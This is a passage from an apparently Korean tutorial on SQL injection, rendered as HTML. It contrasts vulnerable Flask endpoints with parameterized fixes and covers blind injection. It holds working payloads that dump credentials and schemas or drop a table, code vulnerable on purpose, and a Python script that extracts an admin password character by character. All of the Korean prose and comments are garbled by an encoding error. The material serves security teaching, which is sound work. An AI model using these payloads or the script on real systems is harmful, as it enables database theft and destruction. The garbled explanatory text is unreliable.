<span class="c1"># username: &#39; OR &#39;1&#39;=&#39;1         â†’ ì²« ë²ˆì§¸ ì‚¬ìš©ì ë°˜í™˜</span>
<span class="c1"># username: &#39; UNION SELECT 1,2,3,username,password FROM users --</span>
<span class="c1">#                                â†’ ëª¨ë“  ì‚¬ìš©ìëª…ê³¼ ë¹„ë°€ë²ˆí˜¸ ì¶”ì¶œ</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/v1/search&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">search_vulnerable</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ì·¨ì•½: ê²€ìƒ‰ì—ì„œ SQL Injection.&quot;&quot;&quot;</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="n">db</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
    <span class="c1"># ì ˆëŒ€ í•˜ì§€ ë§ ê²ƒ</span>
    <span class="n">sql</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT * FROM products WHERE name LIKE &#39;%</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">%&#39;&quot;</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">jsonify</span><span class="p">([</span><span class="nb">dict</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">results</span><span class="p">])</span>

<span class="c1"># ê³µê²© í˜ì´ë¡œë“œ:</span>
<span class="c1"># q=&#39; UNION SELECT 1,sql,3,4,5 FROM sqlite_master --</span>
<span class="c1">#   â†’ ë°ì´í„°ë² ì´ìŠ¤ ìŠ¤í‚¤ë§ˆ ì¶”ì¶œ</span>
<span class="c1"># q=&#39; UNION SELECT 1,username,3,password,5 FROM users --</span>
<span class="c1">#   â†’ ì‚¬ìš©ì ìê²© ì¦ëª… ì¶”ì¶œ</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ì·¨ì•½: UNION ê¸°ë°˜ ì¶”ì¶œ</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/v1/product/&lt;int:product_id&gt;&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">get_product_vulnerable</span><span class="p">(</span><span class="n">product_id</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ì·¨ì•½: int íƒ€ì… íŒíŠ¸ê°€ ìˆì–´ë„ ë‹¤ë¥¸ ë§¤ê°œë³€ìˆ˜ê°€ ì£¼ì… ê°€ëŠ¥.&quot;&quot;&quot;</span>
    <span class="n">sort</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;sort&#39;</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">)</span>

    <span class="n">db</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
    <span class="c1"># sort ë§¤ê°œë³€ìˆ˜ê°€ ë§¤ê°œë³€ìˆ˜í™”ë˜ì§€ ì•ŠìŒ!</span>
    <span class="n">sql</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT * FROM products WHERE id = ? ORDER BY </span><span class="si">{</span><span class="n">sort</span><span class="si">}</span><span class="s2">&quot;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="p">(</span><span class="n">product_id</span><span class="p">,))</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">jsonify</span><span class="p">([</span><span class="nb">dict</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">result</span><span class="p">])</span>

<span class="c1"># ê³µê²©:</span>
<span class="c1"># /api/v1/product/1?sort=name; DROP TABLE products --</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># ìˆ˜ì •: ë§¤ê°œë³€ìˆ˜í™”ëœ ì¿¼ë¦¬</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/v2/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">login_secure</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ìˆ˜ì •: ë§¤ê°œë³€ìˆ˜í™”ëœ ì¿¼ë¦¬ë¡œ ì¸ì ì…˜ ë°©ì§€.&quot;&quot;&quot;</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="n">db</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
    <span class="c1"># ë§¤ê°œë³€ìˆ˜ í”Œë ˆì´ìŠ¤í™€ë” ì‚¬ìš© (?)</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
        <span class="s2">&quot;SELECT * FROM users WHERE username = ? AND password_hash = ?&quot;</span><span class="p">,</span>
        <span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">hash_password</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
    <span class="p">)</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>

    <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;logged in&quot;</span><span class="p">,</span> <span class="s2">&quot;user&quot;</span><span class="p">:</span> <span class="n">user</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]})</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid credentials&quot;</span><span class="p">}),</span> <span class="mi">401</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/v2/search&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">search_secure</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ìˆ˜ì •: ë§¤ê°œë³€ìˆ˜í™”ëœ ê²€ìƒ‰ ì¿¼ë¦¬.&quot;&quot;&quot;</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="n">db</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
    <span class="n">results</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
        <span class="s2">&quot;SELECT * FROM products WHERE name LIKE ?&quot;</span><span class="p">,</span>
        <span class="p">(</span><span class="sa">f</span><span class="s2">&quot;%</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">%&quot;</span><span class="p">,)</span>  <span class="c1"># ì „ì²´ ê²€ìƒ‰ì–´ê°€ ë§¤ê°œë³€ìˆ˜</span>
    <span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">jsonify</span><span class="p">([</span><span class="nb">dict</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">results</span><span class="p">])</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/v2/product/&lt;int:product_id&gt;&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">get_product_secure</span><span class="p">(</span><span class="n">product_id</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ìˆ˜ì •: ORDER BY ì»¬ëŸ¼ì— í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ì‚¬ìš©.&quot;&quot;&quot;</span>
    <span class="n">sort</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;sort&#39;</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">)</span>

    <span class="c1"># í—ˆìš©ëœ ì •ë ¬ ì»¬ëŸ¼ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸</span>
    <span class="n">ALLOWED_SORT_COLUMNS</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="s1">&#39;price&#39;</span><span class="p">,</span> <span class="s1">&#39;created_at&#39;</span><span class="p">,</span> <span class="s1">&#39;rating&#39;</span><span class="p">}</span>
    <span class="k">if</span> <span class="n">sort</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">ALLOWED_SORT_COLUMNS</span><span class="p">:</span>
        <span class="n">sort</span> <span class="o">=</span> <span class="s1">&#39;name&#39;</span>  <span class="c1"># ì•ˆì „í•œ ê¸°ë³¸ê°’</span>

    <span class="n">db</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
    <span class="c1"># ì»¬ëŸ¼ëª…ì€ ë§¤ê°œë³€ìˆ˜í™”í•  ìˆ˜ ì—†ìœ¼ë¯€ë¡œ í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ì‚¬ìš©</span>
    <span class="n">sql</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;SELECT * FROM products WHERE id = ? ORDER BY </span><span class="si">{</span><span class="n">sort</span><span class="si">}</span><span class="s2">&quot;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="p">(</span><span class="n">product_id</span><span class="p">,))</span><span class="o">.</span><span class="n">fetchall</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">jsonify</span><span class="p">([</span><span class="nb">dict</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">result</span><span class="p">])</span>
</code></pre></div>

<h3 id="22-blind-sql-injection">2.2 Blind SQL Injection<a class="header-link" href="#22-blind-sql-injection" title="Permanent link">&para;</a></h3>
<p>ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì¿¼ë¦¬ ê²°ê³¼ë‚˜ ì˜¤ë¥˜ ë©”ì‹œì§€ë¥¼ í‘œì‹œí•˜ì§€ ì•Šì„ ë•Œ, ê³µê²©ìëŠ” blind ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ í•œ ë²ˆì— í•œ ë¹„íŠ¸ì”© ë°ì´í„°ë¥¼ ì¶”ì¶œí•©ë‹ˆë‹¤.</p>
<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="err">â”‚</span><span class="w">              </span><span class="nt">Blind</span><span class="w"> </span><span class="nt">SQL</span><span class="w"> </span><span class="nt">Injection</span><span class="w"> </span><span class="nt">ìœ í˜•</span><span class="w">                             </span><span class="err">â”‚</span>
<span class="err">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">Boolean-Based</span><span class="w"> </span><span class="nt">Blind</span><span class="o">:</span><span class="w">                                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">ì• í”Œë¦¬ì¼€ì´ì…˜ì´</span><span class="w"> </span><span class="nt">TRUEì™€</span><span class="w"> </span><span class="nt">FALSEì—</span><span class="w"> </span><span class="nt">ëŒ€í•´</span><span class="w"> </span><span class="nt">ë‹¤ë¥¸</span><span class="w"> </span><span class="nt">ë™ì‘ì„</span><span class="w"> </span><span class="nt">ë³´ì„</span><span class="w">               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">/</span><span class="nt">user</span><span class="o">?</span><span class="nt">id</span><span class="o">=</span><span class="nt">1</span><span class="w"> </span><span class="nt">AND</span><span class="w"> </span><span class="nt">1</span><span class="o">=</span><span class="nt">1</span><span class="w">    </span><span class="err">â†’</span><span class="w"> </span><span class="nt">ì •ìƒ</span><span class="w"> </span><span class="nt">í˜ì´ì§€</span><span class="w"> </span><span class="o">(</span><span class="nt">TRUE</span><span class="o">)</span><span class="w">                     </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">/</span><span class="nt">user</span><span class="o">?</span><span class="nt">id</span><span class="o">=</span><span class="nt">1</span><span class="w"> </span><span class="nt">AND</span><span class="w"> </span><span class="nt">1</span><span class="o">=</span><span class="nt">2</span><span class="w">    </span><span class="err">â†’</span><span class="w"> </span><span class="nt">ë‹¤ë¥¸</span><span class="w"> </span><span class="nt">í˜ì´ì§€</span><span class="w"> </span><span class="o">(</span><span class="nt">FALSE</span><span class="o">)</span><span class="w">                    </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">ë¬¸ìë³„ë¡œ</span><span class="w"> </span><span class="nt">ë°ì´í„°</span><span class="w"> </span><span class="nt">ì¶”ì¶œ</span><span class="o">:</span><span class="w">                                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">/</span><span class="nt">user</span><span class="o">?</span><span class="nt">id</span><span class="o">=</span><span class="nt">1</span><span class="w"> </span><span class="nt">AND</span><span class="w"> </span><span class="nt">SUBSTRING</span><span class="o">(</span><span class="w">                                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">    </span><span class="o">(</span><span class="nt">SELECT</span><span class="w"> </span><span class="nt">password</span><span class="w"> </span><span class="nt">FROM</span><span class="w"> </span><span class="nt">users</span><span class="w"> </span><span class="nt">WHERE</span><span class="w"> </span><span class="nt">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="o">),</span><span class="w">          </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">    </span><span class="nt">1</span><span class="o">,</span><span class="w"> </span><span class="nt">1</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w">          </span><span class="err">â†’</span><span class="w"> </span><span class="nt">ê°</span><span class="w"> </span><span class="nt">ë¬¸ìì—</span><span class="w"> </span><span class="nt">ëŒ€í•´</span><span class="w"> </span><span class="nt">TRUE</span><span class="o">/</span><span class="nt">FALSE</span><span class="w">              </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">Time-Based</span><span class="w"> </span><span class="nt">Blind</span><span class="o">:</span><span class="w">                                               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">ì• í”Œë¦¬ì¼€ì´ì…˜</span><span class="w"> </span><span class="nt">ì‘ë‹µ</span><span class="w"> </span><span class="nt">ì‹œê°„ì´</span><span class="w"> </span><span class="nt">TRUE</span><span class="o">/</span><span class="nt">FALSEë¥¼</span><span class="w"> </span><span class="nt">ë‚˜íƒ€ëƒ„</span><span class="w">                     </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">/</span><span class="nt">user</span><span class="o">?</span><span class="nt">id</span><span class="o">=</span><span class="nt">1</span><span class="o">;</span><span class="w"> </span><span class="nt">IF</span><span class="o">(</span><span class="nt">1</span><span class="o">=</span><span class="nt">1</span><span class="o">,</span><span class="w"> </span><span class="nt">SLEEP</span><span class="o">(</span><span class="nt">5</span><span class="o">),</span><span class="w"> </span><span class="nt">0</span><span class="o">)</span><span class="w">  </span><span class="err">â†’</span><span class="w"> </span><span class="nt">5ì´ˆ</span><span class="w"> </span><span class="nt">ì§€ì—°</span><span class="w"> </span><span class="o">(</span><span class="nt">TRUE</span><span class="o">)</span><span class="w">           </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">/</span><span class="nt">user</span><span class="o">?</span><span class="nt">id</span><span class="o">=</span><span class="nt">1</span><span class="o">;</span><span class="w"> </span><span class="nt">IF</span><span class="o">(</span><span class="nt">1</span><span class="o">=</span><span class="nt">2</span><span class="o">,</span><span class="w"> </span><span class="nt">SLEEP</span><span class="o">(</span><span class="nt">5</span><span class="o">),</span><span class="w"> </span><span class="nt">0</span><span class="o">)</span><span class="w">  </span><span class="err">â†’</span><span class="w"> </span><span class="nt">ì¦‰ì‹œ</span><span class="w"> </span><span class="nt">ì‘ë‹µ</span><span class="w"> </span><span class="o">(</span><span class="nt">FALSE</span><span class="o">)</span><span class="w">         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="nt">ë°ì´í„°</span><span class="w"> </span><span class="nt">ì¶”ì¶œ</span><span class="o">:</span><span class="w">                                                     </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="o">/</span><span class="nt">user</span><span class="o">?</span><span class="nt">id</span><span class="o">=</span><span class="nt">1</span><span class="o">;</span><span class="w"> </span><span class="nt">IF</span><span class="o">(</span><span class="nt">SUBSTRING</span><span class="o">(</span><span class="w">                                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">    </span><span class="o">(</span><span class="nt">SELECT</span><span class="w"> </span><span class="nt">password</span><span class="w"> </span><span class="nt">FROM</span><span class="w"> </span><span class="nt">users</span><span class="w"> </span><span class="nt">LIMIT</span><span class="w"> </span><span class="nt">1</span><span class="o">),</span><span class="w">                         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">    </span><span class="nt">1</span><span class="o">,</span><span class="w"> </span><span class="nt">1</span><span class="o">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="o">,</span><span class="w">                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">    </span><span class="nt">SLEEP</span><span class="o">(</span><span class="nt">5</span><span class="o">),</span><span class="w"> </span><span class="nt">0</span><span class="o">)</span><span class="w">          </span><span class="err">â†’</span><span class="w"> </span><span class="nt">ì²«</span><span class="w"> </span><span class="nt">ë¬¸ìê°€</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="nt">ì´ë©´</span><span class="w"> </span><span class="nt">ì§€ì—°</span><span class="w">                </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">blind_sqli_demo.py - Blind SQL injection ì‘ë™ ë°©ì‹ ì‹œì—°</span>
<span class="sd">êµìœ¡ ëª©ì ìœ¼ë¡œë§Œ ì‚¬ìš©</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">string</span><span class="w"> </span><span class="kn">import</span> <span class="n">ascii_lowercase</span><span class="p">,</span> <span class="n">digits</span>

<span class="c1"># ê³µê²©ìì˜ ìŠ¤í¬ë¦½íŠ¸ê°€ ì–´ë–»ê²Œ ë³´ì´ëŠ”ì§€ ì‹œë®¬ë ˆì´ì…˜</span>
<span class="c1"># ì†Œìœ í•˜ì§€ ì•Šì€ ì‹œìŠ¤í…œì— ëŒ€í•´ ì‚¬ìš©í•˜ì§€ ë§ ê²ƒ</span>

<span class="n">TARGET</span> <span class="o">=</span> <span class="s2">&quot;http://vulnerable-app.local/user&quot;</span>
<span class="n">CHARSET</span> <span class="o">=</span> <span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">digits</span> <span class="o">+</span> <span class="s2">&quot;!@#$%&quot;</span>


<span class="k">def</span><span class="w"> </span><span class="nf">boolean_blind_extract</span><span class="p">(</span><span class="n">query_template</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">max_length</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">32</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    boolean ê¸°ë°˜ blind SQL injectionì„ ì‚¬ìš©í•˜ì—¬ ë°ì´í„° ì¶”ì¶œ.</span>
<span class="sd">    query_templateì—ëŠ” {pos}ì™€ {char} í”Œë ˆì´ìŠ¤í™€ë”ê°€ ìˆì–´ì•¼ í•¨.</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>

    <span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">max_length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
        <span class="n">found</span> <span class="o">=</span> <span class="kc">False</span>
        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">CHARSET</span><span class="p">:</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="n">query_template</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">pos</span><span class="o">=</span><span class="n">pos</span><span class="p">,</span> <span class="n">char</span><span class="o">=</span><span class="n">char</span><span class="p">)</span>
            <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;id&quot;</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>

            <span class="k">if</span> <span class="s2">&quot;Welcome&quot;</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>  <span class="c1"># TRUE ì¡°ê±´</span>
                <span class="n">result</span> <span class="o">+=</span> <span class="n">char</span>
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Position </span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s2">: &#39;</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s2">&#39; (extracted so far: &#39;</span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&#39;)&quot;</span><span class="p">)</span>
                <span class="n">found</span> <span class="o">=</span> <span class="kc">True</span>
                <span class="k">break</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
            <span class="k">break</span>  <span class="c1"># ë¬¸ìì—´ ë</span>

    <span class="k">return</span> <span class="n">result</span>


<span class="k">def</span><span class="w"> </span><span class="nf">time_blind_extract</span><span class="p">(</span><span class="n">query_template</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">max_length</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">32</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    ì‹œê°„ ê¸°ë°˜ blind SQL injectionì„ ì‚¬ìš©í•˜ì—¬ ë°ì´í„° ì¶”ì¶œ.</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>

    <span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">max_length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
        <span class="n">found</span> <span class="o">=</span> <span class="kc">False</span>
        <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">CHARSET</span><span class="p">:</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="n">query_template</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">pos</span><span class="o">=</span><span class="n">pos</span><span class="p">,</span> <span class="n">char</span><span class="o">=</span><span class="n">char</span><span class="p">)</span>
            <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
            <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">TARGET</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;id&quot;</span><span class="p">:</span> <span class="n">payload</span><span class="p">})</span>
            <span class="n">elapsed</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span>

            <span class="k">if</span> <span class="n">elapsed</span> <span class="o">&gt;</span> <span class="mi">4</span><span class="p">:</span>  <span class="c1"># ì§€ì—° ê°ì§€ = TRUE</span>
                <span class="n">result</span> <span class="o">+=</span> <span class="n">char</span>
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Position </span><span class="si">{</span><span class="n">pos</span><span class="si">}</span><span class="s2">: &#39;</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s2">&#39; (elapsed: </span><span class="si">{</span><span class="n">elapsed</span><span class="si">:</span><span class="s2">.1f</span><span class="si">}</span><span class="s2">s)&quot;</span><span class="p">)</span>
                <span class="n">found</span> <span class="o">=</span> <span class="kc">True</span>
                <span class="k">break</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">found</span><span class="p">:</span>
            <span class="k">break</span>

    <span class="k">return</span> <span class="n">result</span>


<span class="c1"># ì˜ˆì œ: boolean ê¸°ë°˜ blindë¡œ admin ë¹„ë°€ë²ˆí˜¸ ì¶”ì¶œ</span>
<span class="c1"># admin_password = boolean_blind_extract(</span>
<span class="c1">#     &quot;1 AND SUBSTRING((SELECT password FROM users WHERE username=&#39;admin&#39;),{pos},1)=&#39;{char}&#39;&quot;</span>
<span class="c1"># )</span>
</code></pre></div>

<h3 id="23-second-order-sql-injection">2.3 Second-Order SQL Injection<a class="header-link" href="#23-second-order-sql-injection" title="Permanent link">&para;</a></h3>
<p>Second-order SQL injectionì€ ì‚¬ìš©ì ì…ë ¥ì´ ë°ì´í„°ë² ì´ìŠ¤ì— ì €ì¥ëœ í›„ ë‚˜ì¤‘ì— ë‹¤ë¥¸ ì¿¼ë¦¬ì—ì„œ ì•ˆì „í•˜ì§€ ì•Šê²Œ ì‚¬ìš©ë  ë•Œ ë°œìƒí•©ë‹ˆë‹¤.</p>
